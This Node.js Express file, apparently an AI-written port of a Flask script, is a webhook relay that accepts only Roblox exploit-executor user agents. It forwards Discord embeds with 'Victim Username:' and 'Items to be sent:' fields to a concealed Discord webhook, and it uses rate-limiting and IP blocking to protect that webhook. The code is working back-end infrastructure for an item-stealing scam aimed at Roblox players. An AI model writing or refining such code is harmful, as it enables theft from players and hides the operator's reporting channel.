// This is a Node.js (Express) version of your Flask webhook proxy.

const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const app = express();

const BLOCKED_IPS_FILE = path.join(__dirname, "blocked_ips.json");
const USER_AGENT_FILE = path.join(__dirname, "user_agents.json");
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

const ACCEPTED_USER_AGENTS = [
  "codex android",
  "vega x android",
  "appleware ios",
  "delta android",
  "fluxus",
  "arceus x android",
  "trigon android",
  "evon android",
  "alysse android",
  "delta/v1.0",
  "roblox/darwinrobloxapp/0.626.1.6260363 (globaldist; robloxdirectdownload)",
  "hydrogen/v1.0",
  "hydrogen/v3.0",
  "roblox/wininet"
];

app.use(bodyParser.json());

let BLOCKED_IPS = fs.existsSync(BLOCKED_IPS_FILE) ? JSON.parse(fs.readFileSync(BLOCKED_IPS_FILE)) : [];
let USER_AGENTS = fs.existsSync(USER_AGENT_FILE) ? JSON.parse(fs.readFileSync(USER_AGENT_FILE)) : {};

const updateBlockedIPs = () => fs.writeFileSync(BLOCKED_IPS_FILE, JSON.stringify(BLOCKED_IPS));
const updateUserAgents = () => fs.writeFileSync(USER_AGENT_FILE, JSON.stringify(USER_AGENTS));

// Middleware to block IPs manually
app.use((req, res, next) => {
  const ip = req.ip;
  if (BLOCKED_IPS.includes(ip)) return res.status(403).json({ error: "Unauthorized" });
  next();
});

const requestCounts = new Map();
const TIME_WINDOW = 60 * 1000;
const REQUEST_LIMIT = 3;

// Simple rate-limiting (custom)
app.use((req, res, next) => {
  const ip = req.ip;
  const now = Date.now();
  if (!requestCounts.has(ip)) requestCounts.set(ip, []);

  const timestamps = requestCounts.get(ip).filter(ts => now - ts <= TIME_WINDOW);
  timestamps.push(now);
  requestCounts.set(ip, timestamps);

  if (timestamps.length > REQUEST_LIMIT) {
    if (!BLOCKED_IPS.includes(ip)) {
      BLOCKED_IPS.push(ip);
      updateBlockedIPs();
    }
    return res.status(403).json({ error: "Unauthorized" });
  }

  next();
});

function isValidWebhookRequest(reqBody) {
  const embeds = reqBody.embeds;
  if (!Array.isArray(embeds) || embeds.length !== 1 || typeof embeds[0] !== "object") return false;
  const fields = embeds[0].fields;
  if (!Array.isArray(fields) || fields.length !== 3) return false;
  if (fields[0].name !== "Victim Username:" || fields[1].name !== "Items to be sent:" || fields[2].name !== "Summary:") return false;
  if (fields[0].value.includes(" ") || fields[0].value.length > 20) return false;
  return true;
}

app.post("/postwebhook", async (req, res) => {
  const userAgent = (req.headers["user-agent"] || "").toLowerCase();
  const discUser = req.headers["discuser"];

  if (!ACCEPTED_USER_AGENTS.includes(userAgent)) return res.status(403).json({ error: "Unauthorized" });

  const body = req.body;
  if (Object.values(body).some(v => typeof v === "string" && v.includes("@"))) return res.status(403).json({ error: "Unauthorized" });

  // Replace this with your actual DB lookup logic
  const webhookUrl = DISCORD_WEBHOOK_URL;
  if (!webhookUrl) return res.status(403).json({ error: "Unauthorized" });

  if (!isValidWebhookRequest(body)) return res.status(403).json({ error: "Unauthorized" });

  try {
    const response = await axios.post(webhookUrl, body);
    res.status(response.status).json({ status: "success" });
  } catch (err) {
    res.status(500).json({ error: "Failed to send webhook" });
  }
});

app.post("/webhook", async (req, res) => {
  const userAgent = (req.headers["user-agent"] || "").toLowerCase();
  USER_AGENTS[userAgent] = (USER_AGENTS[userAgent] || 0) + 1;
  updateUserAgents();

  if (!ACCEPTED_USER_AGENTS.includes(userAgent)) return res.status(403).json({ error: "Unauthorized" });

  const body = req.body;
  if (Object.values(body).some(v => typeof v === "string" && v.includes("@"))) return res.status(403).json({ error: "Unauthorized" });

  if (!isValidWebhookRequest(body)) return res.status(403).json({ error: "Unauthorized" });

  body.embeds[0].fields[0].value = "Username redacted";

  try {
    const response = await axios.post(DISCORD_WEBHOOK_URL, body);
    res.status(response.status).json({ status: "success" });
  } catch (err) {
    res.status(500).json({ error: "Failed to send webhook" });
  }
});

module.exports = app;
